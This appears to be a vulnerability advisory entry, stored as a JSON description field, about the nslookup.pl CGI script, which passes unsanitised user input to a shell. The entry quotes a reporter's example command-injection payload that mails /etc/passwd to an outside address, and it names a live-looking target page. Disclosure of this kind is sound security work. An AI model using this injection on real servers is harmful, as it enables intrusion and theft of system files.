  "Description": "The nslookup.pl program (available from\nhttp://www.cc.utah.edu/~keide/Software/UofU_DNS_Tools/UofU_DNS_Tools.tar.gz)\ndoes not not check the user-supplied input to see whether it\ncontains shell metacharacters, and hence commands.  This means that\na person using this CGI script can execute arbitrary commands on\nthe server host as the uid of the server process.\n\nThe reporter writes:\n\nFor example, http://www.nsg.nwu.edu/request/nslookup.html,\nit is easy to get /etc/passwd like\n`mail foo@bar.co.jp < /etc/passwd`",
